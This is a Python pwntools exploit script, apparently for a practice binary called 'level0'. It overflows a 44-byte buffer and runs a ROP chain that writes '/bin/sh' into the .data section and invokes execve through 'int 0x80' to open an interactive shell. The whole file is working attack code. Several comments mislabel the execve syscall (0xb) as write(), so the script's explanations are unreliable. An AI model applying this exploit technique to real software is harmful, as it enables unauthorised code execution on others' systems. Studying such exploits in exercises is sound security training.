#!/usr/bin/python 
from pwn import *

binName = "/home/tao/shellcode/level0" # Program name
rop = ROP(binName) # Find ROP gadgets
offset = 44        # Space from start of buffer to right before eip

bin_addr = 0x80ca660     # First 4 bytes will contain "/bin" string
sh_addr = bin_addr + 0x4 # The next 4 bytes will contain "/sh\x00" string
bin_sh = bin_addr        # Points to the start of the "/bin/sh\x00" string

# Gadgets to move string to a particular address
pop_edx = (rop.find_gadget(['pop edx','ret']))[0]
pop_eax = (rop.find_gadget(['pop eax','ret']))[0] 
mov_data_from_eax_into_address_at_edx = 0x8079191

# Gadgets to call write()
pop_edx_ecx_ebx = (rop.find_gadget(['pop edx','pop ecx','pop ebx','ret']))[0]
int_80 = (rop.find_gadget(['int 0x80']))[0]

# Display info of various gadgets to the user
log.info("Addr at .data to contain '/bin/sh\\x00' : " + hex(bin_sh))
log.info("pop edx : " + hex(pop_edx))
log.info("pop eax : " + hex(pop_eax))
log.info("mov dword ptr [edx], eax : " + hex(mov_data_from_eax_into_address_at_edx))
log.info("pop edx, pop ecx, pop ebx : " + hex(pop_edx_ecx_ebx))
log.info("int 0x80 : " + hex(int_80))

# Does a conversion from hex to packed binary format
bin_sh = p32(bin_sh)
bin_addr = p32(bin_addr)
sh_addr = p32(sh_addr)
pop_edx = p32(pop_edx)
pop_eax = p32(pop_eax)
mov_data_from_eax_into_address_at_edx = p32(mov_data_from_eax_into_address_at_edx)
pop_edx_ecx_ebx = p32(pop_edx_ecx_ebx)
int_80 = p32(int_80)

write_bin = ""
write_bin += pop_edx # Pops address to contain "//bin" string into edx
write_bin += bin_addr
write_bin += pop_eax # Pops "/bin" into eax
write_bin += "/bin"  
write_bin += mov_data_from_eax_into_address_at_edx # Moves "/bin/" into the address contained in edx
log.success("Write /bin into .data ok!")

write_sh = "" 
write_sh += pop_edx # Pops address to contain "/sh\x00" string into edx 
write_sh += sh_addr 
write_sh += pop_eax # Pops "/sh\x00" into eax
write_sh += "/sh\x00"
write_sh += mov_data_from_eax_into_address_at_edx # Moves "/sh\x00" into the address contained in edx
log.success("Write /sh\\x00 into .data ok!")

pop_shell = ""
pop_shell += pop_eax  # Pops 0xb into eax, Syscall number for write 
pop_shell += p32(0xb) 
pop_shell += pop_edx_ecx_ebx
pop_shell += p32(0x0) # edx - 0x0
pop_shell += p32(0x0) # ecx - 0x0
pop_shell += bin_sh   # ebx - "/bin/sh\x00"
pop_shell += int_80   # Calls the kernel
log.success("Setting register values -> eax: 0xb , ebx : '/bin/sh\\x00' , ecx : 0x0 , edx : 0x0")

# Final payload
payload = "" 
payload += "A" * offset
payload += write_bin
payload += write_sh
payload += pop_shell
log.success("Forming final payload!")

p = process(binName) # Starts the program
p.recvline()         # Skips "whats your name" prompt 

raw_input(str(p.proc.pid)) # For GDB
p.sendline(payload)        # Sends payload to the program
p.interactive()            # Passes control of program back to user
